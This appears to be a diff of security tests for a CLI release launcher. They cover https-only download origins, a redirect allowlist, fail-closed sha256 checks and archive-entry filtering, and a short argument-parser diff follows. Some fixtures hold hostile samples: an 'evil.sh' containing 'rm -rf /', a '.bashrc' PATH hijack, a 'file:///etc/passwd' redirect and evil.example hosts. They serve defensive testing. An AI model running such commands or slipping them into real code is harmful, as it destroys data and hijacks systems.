-+ *  - the archive's sha256 must match the one published on npm, and a missing
-+ *    checksum is a refusal, not a pass.
-+ */
-+import { describe, expect, test } from 'bun:test'
-+import { createHash } from 'node:crypto'
-+import { createServer } from 'node:http'
-+import {
-+  existsSync,
-+  mkdirSync,
-+  mkdtempSync,
-+  readdirSync,
-+  readFileSync,
-+  rmSync,
-+  writeFileSync,
-+} from 'node:fs'
-+import { createRequire } from 'node:module'
-+import type { AddressInfo } from 'node:net'
-+import { tmpdir } from 'node:os'
-+import { join } from 'node:path'
-+import { Readable } from 'node:stream'
-+import { fileURLToPath } from 'node:url'
-+
-+const require = createRequire(import.meta.url)
-+const repoRoot = fileURLToPath(new URL('../../../../', import.meta.url))
-+const releaseCore = join(repoRoot, 'cli/release-core')
-+
-+const launcherModule = require(join(releaseCore, 'launcher.js'))
-+const { evaluateRedirect, createReleaseHttpClient } = require(
-+  join(releaseCore, 'http.js'),
-+)
-+const checksumScript = require(join(releaseCore, 'write-binary-checksums.js'))
-+
-+const sha256 = (data: Buffer | string) =>
-+  createHash('sha256').update(data).digest('hex')
-+
-+describe('download origin', () => {
-+  const { resolveDownloadOrigin, DEFAULT_DOWNLOAD_ORIGIN } = launcherModule
-+
-+  test('defaults to codebuff.com over https', () => {
-+    expect(DEFAULT_DOWNLOAD_ORIGIN).toBe('https://codebuff.com')
-+    expect(resolveDownloadOrigin(undefined)).toBe(DEFAULT_DOWNLOAD_ORIGIN)
-+    expect(resolveDownloadOrigin('')).toBe(DEFAULT_DOWNLOAD_ORIGIN)
-+    expect(resolveDownloadOrigin('   ')).toBe(DEFAULT_DOWNLOAD_ORIGIN)
-+  })
-+
-+  test('honours an https override, without a trailing slash', () => {
-+    expect(resolveDownloadOrigin('https://staging.codebuff.com/')).toBe(
-+      'https://staging.codebuff.com',
-+    )
-+    expect(resolveDownloadOrigin('https://example.internal:8443')).toBe(
-+      'https://example.internal:8443',
-+    )
-+  })
-+
-+  test('allows plain http only on loopback hosts', () => {
-+    for (const origin of [
-+      'http://localhost:3000',
-+      'http://127.0.0.1:41234',
-+      'http://[::1]:3000',
-+      'http://LOCALHOST',
-+    ]) {
-+      expect(resolveDownloadOrigin(origin)).toBe(origin)
-+    }
-+  })
-+
-+  test('ignores a plain-http override for any other host and warns', () => {
-+    const warnings: string[] = []
-+    const warn = (message: string) => warnings.push(message)
-+
-+    expect(resolveDownloadOrigin('http://codebuff.com', { warn })).toBe(
-+      DEFAULT_DOWNLOAD_ORIGIN,
-+    )
-+    expect(
-+      resolveDownloadOrigin('http://evil.example.com/releases', { warn }),
-+    ).toBe(DEFAULT_DOWNLOAD_ORIGIN)
-+    // Not even a lookalike of a loopback address.
-+    expect(
-+      resolveDownloadOrigin('http://127.0.0.1.evil.example', { warn }),
-+    ).toBe(DEFAULT_DOWNLOAD_ORIGIN)
-+    expect(resolveDownloadOrigin('ftp://codebuff.com', { warn })).toBe(
-+      DEFAULT_DOWNLOAD_ORIGIN,
-+    )
-+    expect(resolveDownloadOrigin('not a url', { warn })).toBe(
-+      DEFAULT_DOWNLOAD_ORIGIN,
-+    )
-+
-+    expect(warnings).toHaveLength(5)
-+    expect(warnings[0]).toContain('http://codebuff.com')
-+    expect(warnings[0]).toContain('must use https')
-+  })
-+})
-+
-+describe('redirect policy', () => {
-+  const start = 'https://codebuff.com/api/releases/download/1.0.0/x.tar.gz'
-+
-+  test('follows the chain the release route actually produces', () => {
-+    const hop1 = evaluateRedirect(
-+      start,
-+      'https://github.com/CodebuffAI/codebuff-community/releases/download/v1.0.0/x.tar.gz',
-+      { originalUrl: start },
-+    )
-+    expect(hop1).toEqual({
-+      ok: true,
-+      url: 'https://github.com/CodebuffAI/codebuff-community/releases/download/v1.0.0/x.tar.gz',
-+    })
-+
-+    const hop2 = evaluateRedirect(
-+      hop1.url,
-+      'https://objects.githubusercontent.com/github-production-release-asset/abc?X-Amz-Signature=1',
-+      { originalUrl: start },
-+    )
-+    expect(hop2.ok).toBe(true)
-+
-+    const hop3 = evaluateRedirect(
-+      hop1.url,
-+      'https://release-assets.githubusercontent.com/asset',
-+      { originalUrl: start },
-+    )
-+    expect(hop3.ok).toBe(true)
-+  })
-+
-+  test('allows the freebuff and www hosts and the original host', () => {
-+    for (const host of [
-+      'freebuff.com',
-+      'www.freebuff.com',
-+      'www.codebuff.com',
-+      'CODEBUFF.COM',
-+    ]) {
-+      expect(evaluateRedirect(start, `https://${host}/asset`).ok).toBe(true)
-+    }
-+
-+    const localStart = 'http://127.0.0.1:4321/api/releases/download/1/x'
-+    expect(
-+      evaluateRedirect(localStart, 'http://127.0.0.1:4321/files/x', {
-+        originalUrl: localStart,
-+      }).ok,
-+    ).toBe(true)
-+    // A relative Location stays on the current host.
-+    expect(evaluateRedirect(start, '/somewhere/else').ok).toBe(true)
-+  })
-+
-+  test('refuses an https to http downgrade even to an allowed host', () => {
-+    const result = evaluateRedirect(start, 'http://codebuff.com/asset')
-+    expect(result.ok).toBe(false)
-+    expect(result.reason).toContain('insecure http')
-+    expect(result.reason).toContain('codebuff.com')
-+
-+    // The original host is not a loophole for the downgrade rule either.
-+    const original = 'https://releases.example.com/x'
-+    expect(
-+      evaluateRedirect(original, 'http://releases.example.com/y', {
-+        originalUrl: original,
-+      }).ok,
-+    ).toBe(false)
-+  })
-+
-+  test('refuses any host outside the allowlist and names it', () => {
-+    for (const location of [
-+      'https://evil.example.com/asset',
-+      'https://codebuff.com.evil.example/asset',
-+      'https://githubusercontent.com.evil.example/asset',
-+      'https://notgithubusercontent.com/asset',
-+      'https://github.com.evil/asset',
-+    ]) {
-+      const result = evaluateRedirect(start, location, { originalUrl: start })
-+      expect(result.ok).toBe(false)
-+      expect(result.reason).toContain(new URL(location).hostname)
-+    }
-+  })
-+
-+  test('the original host means the FIRST url of the chain, not the previous hop', () => {
-+    // After hopping to github.com, a redirect back to an unrelated host must
-+    // not be admitted just because github.com was the last hop.
-+    const viaGithub = 'https://github.com/x/releases/download/v1/x.tar.gz'
-+    const result = evaluateRedirect(viaGithub, 'https://evil.example.com/x', {
-+      originalUrl: start,
-+    })
-+    expect(result.ok).toBe(false)
-+  })
-+
-+  test('refuses non-http protocols and unparsable locations', () => {
-+    expect(evaluateRedirect(start, 'ftp://codebuff.com/x').ok).toBe(false)
-+    expect(evaluateRedirect(start, 'file:///etc/passwd').ok).toBe(false)
-+    expect(evaluateRedirect(start, 'http://').ok).toBe(false)
-+  })
-+})
-+
-+describe('httpGet enforces the redirect policy on the wire', () => {
-+  function fakeResponse(
-+    statusCode: number,
-+    headers: Record<string, string>,
-+    body = '',
-+  ) {
-+    return Object.assign(Readable.from(body ? [body] : []), {
-+      statusCode,
-+      headers,
-+    })
-+  }
-+
-+  function clientWithRedirects(hops: Array<[number, string]>) {
-+    const requested: string[] = []
-+    let call = 0
-+    const get = (
-+      options: Record<string, any>,
-+      callback: (response: Readable) => void,
-+    ) => {
-+      requested.push(`${options.hostname}${options.path}`)
-+      const hop = hops[call++]
-+      queueMicrotask(() => {
-+        callback(
-+          hop
-+            ? fakeResponse(hop[0], { location: hop[1] })
-+            : fakeResponse(200, {}, 'ok'),
-+        )
-+      })
-+      return {
-+        on() {
-+          return this
-+        },
-+        setTimeout() {
-+          return this
-+        },
-+        destroy() {},
-+      }
-+    }
-+    const client = createReleaseHttpClient({
-+      env: {},
-+      userAgent: 'test',
-+      requestTimeout: 1000,
-+      httpModule: { get },
-+      httpsModule: { get },
-+    })
-+    return { client, requested }
-+  }
-+
-+  test('follows codebuff.com -> github.com -> githubusercontent.com', async () => {
-+    const { client, requested } = clientWithRedirects([
-+      [302, 'https://github.com/o/r/releases/download/v1/x.tar.gz'],
-+      [302, 'https://objects.githubusercontent.com/asset?sig=1'],
-+    ])
-+    const response = await client.httpGet(
-+      'https://codebuff.com/api/releases/download/1/x.tar.gz',
-+    )
-+    response.resume()
-+    expect(response.statusCode).toBe(200)
-+    expect(requested).toEqual([
-+      'codebuff.com/api/releases/download/1/x.tar.gz',
-+      'github.com/o/r/releases/download/v1/x.tar.gz',
-+      'objects.githubusercontent.com/asset?sig=1',
-+    ])
-+  })
-+
-+  test('stops at a downgrade and does not contact the http host', async () => {
-+    const { client, requested } = clientWithRedirects([
-+      [302, 'http://codebuff.com/asset'],
-+    ])
-+    await expect(
-+      client.httpGet('https://codebuff.com/api/releases/download/1/x.tar.gz'),
-+    ).rejects.toMatchObject({
-+      code: 'EREDIRECT_REFUSED',
-+      retryable: false,
-+    })
-+    expect(requested).toHaveLength(1)
-+  })
-+
-+  test('stops at a foreign host, even after a legitimate hop', async () => {
-+    const { client, requested } = clientWithRedirects([
-+      [302, 'https://github.com/o/r/releases/download/v1/x.tar.gz'],
-+      [307, 'https://evil.example.com/x.tar.gz'],
-+    ])
-+    await expect(
-+      client.httpGet('https://codebuff.com/api/releases/download/1/x.tar.gz'),
-+    ).rejects.toThrow('evil.example.com')
-+    expect(requested).toHaveLength(2)
-+  })
-+})
-+
-+describe('archive checksum verification', () => {
-+  const { verifyFileSha256, computeFileSha256, isSha256Hex } = launcherModule
-+
-+  function withTempFile(
-+    contents: string,
-+    run: (path: string) => Promise<void>,
-+  ) {
-+    const dir = mkdtempSync(join(tmpdir(), 'launcher-sha-'))
-+    const file = join(dir, 'archive.tar.gz')
-+    writeFileSync(file, contents)
-+    return run(file).finally(() =>
-+      rmSync(dir, { recursive: true, force: true }),
-+    )
-+  }
-+
-+  test('computes the sha256 of a file', () =>
-+    withTempFile('hello world', async (file) => {
-+      expect(await computeFileSha256(file)).toBe(sha256('hello world'))
-+    }))
-+
-+  test('passes on a matching digest, in either case', () =>
-+    withTempFile('archive bytes', async (file) => {
-+      const digest = sha256('archive bytes')
-+      expect(await verifyFileSha256(file, digest)).toEqual({
-+        ok: true,
-+        actual: digest,
-+      })
-+      expect((await verifyFileSha256(file, digest.toUpperCase())).ok).toBe(true)
-+    }))
-+
-+  test('fails on a mismatch and reports both digests', () =>
-+    withTempFile('archive bytes', async (file) => {
-+      const expected = sha256('something else')
-+      const result = await verifyFileSha256(file, expected)
-+      expect(result.ok).toBe(false)
-+      expect(result.actual).toBe(sha256('archive bytes'))
-+      expect(result.reason).toContain(expected)
-+      expect(result.reason).toContain(sha256('archive bytes'))
-+    }))
-+
-+  test('fails CLOSED when no checksum is published', () =>
-+    withTempFile('archive bytes', async (file) => {
-+      for (const missing of [undefined, null, '', 'abc', 42, {}]) {
-+        const result = await verifyFileSha256(file, missing)
-+        expect(result.ok).toBe(false)
-+        expect(result.reason).toContain('no sha256 checksum')
-+      }
-+    }))
-+
-+  test('isSha256Hex accepts exactly 64 hex characters', () => {
-+    expect(isSha256Hex('a'.repeat(64))).toBe(true)
-+    expect(isSha256Hex('A'.repeat(64))).toBe(true)
-+    expect(isSha256Hex('a'.repeat(63))).toBe(false)
-+    expect(isSha256Hex('g'.repeat(64))).toBe(false)
-+    expect(isSha256Hex(undefined)).toBe(false)
-+  })
-+})
-+
-+describe('write-binary-checksums.js (release side)', () => {
-+  const { TARGET_KEYS, computeChecksums, findChecksumProblems } = checksumScript
-+
-+  test('covers exactly the targets the launcher can download', () => {
-+    expect(TARGET_KEYS).toEqual(launcherModule.PLATFORM_TARGET_KEYS)
-+    const launcher = launcherModule.createLauncher({
-+      packageName: 'freebuff',
-+      displayName: 'Freebuff',
-+    })
-+    expect(Object.keys(launcher.__testing.PLATFORM_TARGETS)).toEqual(
-+      TARGET_KEYS,
-+    )
-+    // And the file it hashes is the file the launcher asks the origin for.
-+    for (const target of TARGET_KEYS) {
-+      expect(checksumScript.archiveFileName('freebuff', target)).toBe(
-+        launcher.__testing.PLATFORM_TARGETS[target],
-+      )
-+    }
-+  })
-+
-+  function fixtureBinaries(binaryName: string, targets: string[]) {
-+    const root = mkdtempSync(join(tmpdir(), 'release-binaries-'))
-+    const digests: Record<string, string> = {}
-+    for (const target of targets) {
-+      const dir = join(root, `${binaryName}-${target}`)
-+      mkdirSync(dir, { recursive: true })
-+      const contents = `archive for ${target}`
-+      writeFileSync(join(dir, `${binaryName}-${target}.tar.gz`), contents)
-+      digests[target] = sha256(contents)
-+    }
-+    return { root, digests }
-+  }
-+
-+  test('hashes every archive from the artifact layout the workflows download', () => {
-+    const { root, digests } = fixtureBinaries('freebuff', TARGET_KEYS)
-+    try {
-+      expect(computeChecksums(root, 'freebuff')).toEqual({
-+        checksums: digests,
-+        missing: [],
-+      })
-+    } finally {
-+      rmSync(root, { recursive: true, force: true })
-+    }
-+  })
-+
-+  test('write refuses when an archive is missing or empty', () => {
-+    const { root } = fixtureBinaries(
-+      'freebuff',
-+      TARGET_KEYS.filter((t: string) => t !== 'darwin-arm64'),
-+    )
-+    const emptyDir = join(root, 'freebuff-linux-arm64')
-+    writeFileSync(join(emptyDir, 'freebuff-linux-arm64.tar.gz'), '')
-+    const packageDir = join(root, 'pkg')
-+    mkdirSync(packageDir)
-+    writeFileSync(
-+      join(packageDir, 'package.json'),
-+      JSON.stringify({ name: 'freebuff', version: '9.9.9' }),
-+    )
-+    try {
-+      const { missing } = computeChecksums(root, 'freebuff')
-+      expect(missing.map((p: string) => p.split('/').pop())).toEqual([
-+        'freebuff-linux-arm64.tar.gz',
-+        'freebuff-darwin-arm64.tar.gz',
-+      ])
-+      expect(() =>
-+        checksumScript.writeChecksums({
-+          binariesDir: root,
-+          binaryName: 'freebuff',
-+          packageDir,
-+        }),
-+      ).toThrow('Missing or empty release archives')
-+      // Nothing was stamped.
-+      expect(
-+        JSON.parse(readFileSync(join(packageDir, 'package.json'), 'utf8'))
-+          .binaryChecksums,
-+      ).toBeUndefined()
-+    } finally {
-+      rmSync(root, { recursive: true, force: true })
-+    }
-+  })
-+
-+  test('write stamps the map and verify accepts it; verify rejects a gap', () => {
-+    const { root, digests } = fixtureBinaries('codebuff', TARGET_KEYS)
-+    const packageDir = join(root, 'pkg')
-+    mkdirSync(packageDir)
-+    const packageJsonPath = join(packageDir, 'package.json')
-+    writeFileSync(
-+      packageJsonPath,
-+      JSON.stringify({ name: 'codebuff', version: '1.2.3', bin: {} }, null, 2) +
-+        '\n',
-+    )
-+    try {
-+      checksumScript.writeChecksums({
-+        binariesDir: root,
-+        binaryName: 'codebuff',
-+        packageDir,
-+      })
-+      const written = JSON.parse(readFileSync(packageJsonPath, 'utf8'))
-+      expect(written).toMatchObject({ name: 'codebuff', version: '1.2.3' })
-+      expect(written.binaryChecksums).toEqual(digests)
-+      expect(() => checksumScript.verifyChecksums({ packageDir })).not.toThrow()
-+
-+      delete written.binaryChecksums['win32-x64-baseline']
-+      writeFileSync(packageJsonPath, JSON.stringify(written))
-+      expect(() => checksumScript.verifyChecksums({ packageDir })).toThrow(
-+        'win32-x64-baseline: missing',
-+      )
-+    } finally {
-+      rmSync(root, { recursive: true, force: true })
-+    }
-+  })
-+
-+  test("write refuses to stamp one product into another product's manifest", () => {
-+    const { root } = fixtureBinaries('freebuff', TARGET_KEYS)
-+    const packageDir = join(root, 'pkg')
-+    mkdirSync(packageDir)
-+    writeFileSync(
-+      join(packageDir, 'package.json'),
-+      JSON.stringify({ name: 'codebuff', version: '1.0.0' }),
-+    )
-+    try {
-+      expect(() =>
-+        checksumScript.writeChecksums({
-+          binariesDir: root,
-+          binaryName: 'freebuff',
-+          packageDir,
-+        }),
-+      ).toThrow('Refusing to stamp')
-+    } finally {
-+      rmSync(root, { recursive: true, force: true })
-+    }
-+  })
-+
-+  test('findChecksumProblems flags missing, malformed and unknown entries', () => {
-+    const complete = Object.fromEntries(
-+      TARGET_KEYS.map((t: string) => [t, 'b'.repeat(64)]),
-+    )
-+    expect(findChecksumProblems(complete)).toEqual([])
-+    expect(findChecksumProblems(undefined)).toEqual([
-+      'package.json has no binaryChecksums object',
-+    ])
-+    expect(
-+      findChecksumProblems({
-+        ...complete,
-+        'linux-x64': 'nope',
-+        'plan9-mips': 'c'.repeat(64),
-+      }),
-+    ).toEqual([
-+      'linux-x64: not a sha256 hex digest ("nope")',
-+      'plan9-mips: not a known target',
-+    ])
-+  })
-+})
-+
-+describe('the launcher end to end', () => {
-+  const tar = require('tar') as typeof import('tar')
-+  const target = `${process.platform}-${process.arch}`
-+
-+  async function withReleaseServer(
-+    archives: Record<string, Buffer>,
-+    run: (requestedPaths: string[]) => Promise<void>,
-+  ) {
-+    const requestedPaths: string[] = []
-+    const server = createServer((request, response) => {
-+      requestedPaths.push(request.url ?? '')
-+      const file = (request.url ?? '').split('/').pop() ?? ''
-+      const body = archives[file]
-+      if (!body) {
-+        response.writeHead(404)
-+        response.end('missing')
-+        return
-+      }
-+      response.writeHead(200, {
-+        'content-length': body.byteLength,
-+        'content-type': 'application/gzip',
-+      })
-+      response.end(body)
-+    })
-+    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
-+    const { port } = server.address() as AddressInfo
-+    const previous = {
-+      app: process.env.NEXT_PUBLIC_CODEBUFF_APP_URL,
-+      noProxy: process.env.NO_PROXY,
-+    }
-+    process.env.NEXT_PUBLIC_CODEBUFF_APP_URL = `http://127.0.0.1:${port}`
-+    process.env.NO_PROXY = '127.0.0.1'
-+    try {
-+      await run(requestedPaths)
-+    } finally {
-+      if (previous.app === undefined) {
-+        delete process.env.NEXT_PUBLIC_CODEBUFF_APP_URL
-+      } else process.env.NEXT_PUBLIC_CODEBUFF_APP_URL = previous.app
-+      if (previous.noProxy === undefined) delete process.env.NO_PROXY
-+      else process.env.NO_PROXY = previous.noProxy
-+      await new Promise<void>((resolve) => server.close(() => resolve()))
-+    }
-+  }
-+
-+  /** A launcher over a fresh config dir, and an archive of `files`. */
-+  async function fixture(
-+    packageName: string,
-+    files: Record<string, string>,
-+    config: Record<string, unknown> = {},
-+  ) {
-+    const root = mkdtempSync(join(tmpdir(), 'launcher-integrity-'))
-+    const configDir = join(root, 'config')
-+    const archiveDir = join(root, 'archive')
-+    mkdirSync(configDir)
-+    mkdirSync(archiveDir)
-+    const launcher = launcherModule.createLauncher({
-+      packageName,
-+      displayName: packageName,
-+      wrapperVersion: '2.0.0',
-+      includeTreeSitterWasm: false,
-+      configDir,
-+      ...config,
-+    })
-+    const { CONFIG } = launcher.__testing
-+    for (const [name, contents] of Object.entries(files)) {
-+      writeFileSync(join(archiveDir, name), contents)
-+    }
-+    const archivePath = join(root, 'release.tar.gz')
-+    await tar.c(
-+      { cwd: archiveDir, file: archivePath, gzip: true },
-+      Object.keys(files),
-+    )
-+    const archive = readFileSync(archivePath)
-+    return {
-+      root,
-+      launcher,
-+      CONFIG,
-+      archive,
-+      archiveName: `${packageName}-${target}.tar.gz`,
-+      cleanup: () => rmSync(root, { recursive: true, force: true }),
-+    }
-+  }
-+
-+  const silence = () => {
-+    const original = { error: console.error, log: console.log }
-+    console.error = () => {}
-+    console.log = () => {}
-+    return () => {
-+      console.error = original.error
-+      console.log = original.log
-+    }
-+  }
-+
-+  test('installs an archive whose sha256 matches the published one', async () => {
-+    const f = await fixture('integ-ok', { 'integ-ok': 'good binary' })
-+    const restore = silence()
-+    try {
-+      const binaryChecksums = { [target]: sha256(f.archive) }
-+      await withReleaseServer({ [f.archiveName]: f.archive }, async () => {
-+        const staged = await f.launcher.__testing.stageBinary('2.0.0', target, {
-+          binaryChecksums,
-+        })
-+        expect(readFileSync(staged.tempBinaryPath, 'utf8')).toBe('good binary')
-+      })
-+    } finally {
-+      restore()
-+      f.cleanup()
-+    }
-+  })
-+
-+  test('refuses an archive whose sha256 does not match, and leaves nothing behind', async () => {
-+    const f = await fixture('integ-bad', { 'integ-bad': 'substituted binary' })
-+    const restore = silence()
-+    try {
-+      const binaryChecksums = { [target]: sha256('the real archive') }
-+      await withReleaseServer(
-+        { [f.archiveName]: f.archive },
-+        async (requestedPaths) => {
-+          await expect(
-+            f.launcher.__testing.stageBinary('2.0.0', target, {
-+              binaryChecksums,
-+            }),
-+          ).rejects.toMatchObject({
-+            code: 'ECHECKSUM',
-+            stage: 'checksum',
-+            retryable: false,
-+          })
-+          // A mismatch is final: no retry re-downloads the same bytes.
-+          expect(requestedPaths).toHaveLength(1)
-+          expect(existsSync(f.CONFIG.binaryPath)).toBe(false)
-+          expect(existsSync(f.CONFIG.tempDownloadDir)).toBe(false)
-+          // The partial archive was discarded so the next run cannot resume
-+          // — and re-verify — the rejected bytes.
-+          expect(
-+            readdirSync(f.CONFIG.configDir).filter((n) => n.endsWith('.part')),
-+          ).toEqual([])
-+        },
-+      )
-+    } finally {
-+      restore()
-+      f.cleanup()
-+    }
-+  })
-+
-+  test('refuses to download at all when no checksum is published (fail closed)', async () => {
-+    const f = await fixture('integ-none', { 'integ-none': 'binary' })
-+    const restore = silence()
-+    try {
-+      await withReleaseServer(
-+        { [f.archiveName]: f.archive },
-+        async (requestedPaths) => {
-+          // An empty map for this very version: the package says nothing
-+          // about this target, so nothing is fetched and nothing installed.
-+          await expect(
-+            f.launcher.__testing.stageBinary('2.0.0', target, {
-+              binaryChecksums: {},
-+            }),
-+          ).rejects.toMatchObject({ code: 'ECHECKSUM', stage: 'checksum' })
-+          expect(requestedPaths).toHaveLength(0)
-+          expect(existsSync(f.CONFIG.binaryPath)).toBe(false)
-+        },
-+      )
-+    } finally {
-+      restore()
-+      f.cleanup()
-+    }
-+  })
-+
-+  test('reads the checksums of its own version from its own manifest', async () => {
-+    const f = await fixture('integ-own', { 'integ-own': 'own binary' })
-+    const restore = silence()
-+    try {
-+      // What index.js passes from package.json: the wrapper is 2.0.0 and its
-+      // manifest carries the digest of 2.0.0's archive.
-+      const own = await fixture(
-+        'integ-own',
-+        { 'integ-own': 'own binary' },
-+        {
-+          binaryChecksums: { [target]: sha256(f.archive) },
-+        },
-+      )
-+      try {
-+        const map = await own.launcher.__testing.resolveBinaryChecksums('2.0.0')
-+        expect(map).toEqual({ [target]: sha256(f.archive) })
-+        // A map handed in by the caller (the registry document that named the
-+        // version) wins over the wrapper's own.
-+        const provided = { [target]: 'f'.repeat(64) }
-+        expect(
-+          await own.launcher.__testing.resolveBinaryChecksums(
-+            '2.0.0',
-+            provided,
-+          ),
-+        ).toBe(provided)
-+        expect(
-+          await own.launcher.__testing.getExpectedChecksum('2.0.0', target),
-+        ).toBe(sha256(f.archive))
-+        await expect(
-+          own.launcher.__testing.getExpectedChecksum('2.0.0', 'linux-arm64'),
-+        ).rejects.toMatchObject({ code: 'ECHECKSUM' })
-+      } finally {
-+        own.cleanup()
-+      }
-+    } finally {
-+      restore()
-+      f.cleanup()
-+    }
-+  })
-+
-+  test('extracts only the binary (and tree-sitter.wasm), never anything else in the archive', async () => {
-+    const f = await fixture(
-+      'integ-filter',
-+      {
-+        'integ-filter': 'the binary',
-+        'tree-sitter.wasm': 'wasm',
-+        'evil.sh': 'rm -rf /',
-+        '.bashrc': 'export PATH=/tmp:$PATH',
-+      },
-+      { includeTreeSitterWasm: true },
-+    )
-+    const restore = silence()
-+    try {
-+      const binaryChecksums = { [target]: sha256(f.archive) }
-+      await withReleaseServer({ [f.archiveName]: f.archive }, async () => {
-+        await f.launcher.__testing.stageBinary('2.0.0', target, {
-+          binaryChecksums,
-+        })
-+        expect(readdirSync(f.CONFIG.tempDownloadDir).sort()).toEqual(
-+          [f.CONFIG.binaryName, 'tree-sitter.wasm'].sort(),
-+        )
-+      })
-+
-+      const { isAllowedArchiveEntry } = f.launcher.__testing
-+      const file = { type: 'File' }
-+      expect(isAllowedArchiveEntry(f.CONFIG.binaryName, file)).toBe(true)
-+      expect(isAllowedArchiveEntry(`./${f.CONFIG.binaryName}`, file)).toBe(true)
-+      expect(isAllowedArchiveEntry('tree-sitter.wasm', file)).toBe(true)
-+      expect(isAllowedArchiveEntry(`bin/${f.CONFIG.binaryName}`, file)).toBe(
-+        false,
-+      )
-+      expect(isAllowedArchiveEntry(`../${f.CONFIG.binaryName}`, file)).toBe(
-+        false,
-+      )
-+      expect(
-+        isAllowedArchiveEntry(f.CONFIG.binaryName, { type: 'SymbolicLink' }),
-+      ).toBe(false)
-+      expect(isAllowedArchiveEntry('evil.sh', file)).toBe(false)
-+    } finally {
-+      restore()
-+      f.cleanup()
-+    }
-+  })
-+
-+  test('builds the download URL through the origin resolver, after the checksum gate', () => {
-+    // The pure resolver carries the https rule (pinned above); this makes
-+    // sure stageBinary cannot reach the environment variable around it, and
-+    // that an unverifiable release is refused before any URL is built.
-+    const source = readFileSync(join(releaseCore, 'launcher.js'), 'utf8')
-+    const stage = source.slice(
-+      source.indexOf('async function stageBinary'),
-+      source.indexOf('function replaceFileWithRollback'),
-+    )
-+    expect(stage).toContain('resolveDownloadOrigin(')
-+    expect(stage).toContain('process.env.NEXT_PUBLIC_CODEBUFF_APP_URL')
-+    expect(stage.indexOf('getExpectedChecksum(')).toBeLessThan(
-+      stage.indexOf('resolveDownloadOrigin('),
-+    )
-+    // Nowhere else reads the override.
-+    expect(source.split('NEXT_PUBLIC_CODEBUFF_APP_URL').length - 1).toBe(
-+      (stage.match(/NEXT_PUBLIC_CODEBUFF_APP_URL/g) ?? []).length +
-+        (
-+          source
-+            .slice(0, source.indexOf('function createLauncher'))
-+            .match(/NEXT_PUBLIC_CODEBUFF_APP_URL/g) ?? []
-+        ).length,
-+    )
-+  })
-+})
-diff --git a/cli/src/__tests__/release/wrapper-safety.test.ts b/cli/src/__tests__/release/wrapper-safety.test.ts
-index aeb0d60c0..70f623302 100644
---- a/cli/src/__tests__/release/wrapper-safety.test.ts
-+++ b/cli/src/__tests__/release/wrapper-safety.test.ts
-@@ -1,4 +1,5 @@
- import { describe, expect, test } from 'bun:test'
-+import { createHash } from 'node:crypto'
- import { EventEmitter } from 'node:events'
- import { createServer } from 'node:http'
- import {
-@@ -244,10 +245,16 @@ describe('shared release launcher safety', () => {
-     mkdirSync(configDir, { recursive: true })
-     mkdirSync(archiveDir, { recursive: true })
- 
-+    // The wrapper's own package.json carries the checksums of its release;
-+    // the map is filled in once the archive exists (same object, by
-+    // reference), exactly as npm would have shipped it.
-+    const target = process.platform + '-' + process.arch
-+    const binaryChecksums: Record<string, string> = {}
-     const launcher = createLauncher({
-       packageName: 'repair-test',
-       displayName: 'Repair Test',
-       wrapperVersion: '2.0.0',
-+      binaryChecksums,
-       includeTreeSitterWasm: false,
-       configDir,
-     })
-@@ -255,10 +262,7 @@ describe('shared release launcher safety', () => {
-     writeFileSync(CONFIG.binaryPath, 'stale binary')
-     writeFileSync(
-       CONFIG.metadataPath,
--      JSON.stringify({
--        version: '1.0.0',
--        target: process.platform + '-' + process.arch,
--      }),
-+      JSON.stringify({ version: '1.0.0', target }),
-     )
-     writeFileSync(join(archiveDir, CONFIG.binaryName), 'replacement binary')
- 
-@@ -267,6 +271,7 @@ describe('shared release launcher safety', () => {
-       CONFIG.binaryName,
-     ])
-     const archive = readFileSync(archivePath)
-+    binaryChecksums[target] = createHash('sha256').update(archive).digest('hex')
-     try {
-       await withLocalReleaseServer(
-         {
-@@ -311,10 +316,14 @@ describe('shared release launcher safety', () => {
- 
-   test('keeps a runnable cached binary when repair is unavailable', async () => {
-     const fixtureRoot = mkdtempSync(join(tmpdir(), 'launcher-offline-'))
-+    const target = process.platform + '-' + process.arch
-     const launcher = createLauncher({
-       packageName: 'offline-test',
-       displayName: 'Offline Test',
-       wrapperVersion: '2.0.0',
-+      // Any published checksum lets the download proceed to the 404 under
-+      // test; without one the launcher refuses before contacting the server.
-+      binaryChecksums: { [target]: 'a'.repeat(64) },
-       includeTreeSitterWasm: false,
-       configDir: fixtureRoot,
-     })
 diff --git a/cli/src/cli-args.ts b/cli/src/cli-args.ts
 index 6694401b7..1ce73347c 100644
 --- a/cli/src/cli-args.ts
 +++ b/cli/src/cli-args.ts
-@@ -16,6 +16,8 @@ export type ParsedArgs = {
+@@ -1,134 +1,145 @@
+ import { createRequire } from 'module'
+ 
+ import { Argument, Command } from 'commander'
+ 
+ import { IS_FREEBUFF, type AgentMode } from './utils/constants'
+ import { getCliEnv } from './utils/env'
+ 
+ const require = createRequire(import.meta.url)
+ 
+ export type ParsedArgs = {
+   initialPrompt: string | null
+   command?: string
+   agent?: string
+   clearLogs: boolean
+   continue: boolean
    continueId?: string | null
    cwd?: string
    initialMode?: AgentMode
@@ -1911,7 +1558,45 @@ index 6694401b7..1ce73347c 100644
  }
  
  export function loadPackageVersion(): string {
-@@ -61,6 +63,10 @@ export function parseArgs({
+   const env = getCliEnv()
+   if (env.CODEBUFF_CLI_VERSION) {
+     return env.CODEBUFF_CLI_VERSION
+   }
+ 
+   try {
+     const pkg = require('../package.json') as { version?: string }
+     if (pkg.version) {
+       return pkg.version
+     }
+   } catch {
+     // Continue to dev fallback
+   }
+ 
+   return 'dev'
+ }
+ 
+ export function parseArgs({
+   argv = process.argv,
+   isFreebuff = IS_FREEBUFF,
+   version = loadPackageVersion(),
+ }: {
+   argv?: string[]
+   isFreebuff?: boolean
+   version?: string
+ } = {}): ParsedArgs {
+   const program = new Command()
+ 
+   if (isFreebuff) {
+     // Freebuff: simplified CLI - no prompt args, no agent override, no clear-logs
+     program
+       .name('freebuff')
+       .description('Freebuff - Free AI coding assistant')
+       .version(version, '-v, --version', 'Print the CLI version')
+       .option(
+         '--continue [conversation-id]',
+         'Continue from a previous conversation (optionally specify a conversation id)',
+       )
+       .option(
          '--cwd <directory>',
          'Set the working directory (default: current directory)',
        )
@@ -1922,7 +1607,26 @@ index 6694401b7..1ce73347c 100644
        .addArgument(
          new Argument('[command]', 'Command to run').choices(['login']),
        )
-@@ -87,6 +93,10 @@ export function parseArgs({
+       .helpOption('-h, --help', 'Show this help message')
+   } else {
+     // Codebuff: full CLI with all options
+     program
+       .name('codebuff')
+       .description('Codebuff CLI - AI-powered coding assistant')
+       .version(version, '-v, --version', 'Print the CLI version')
+       .option(
+         '--agent <agent-id>',
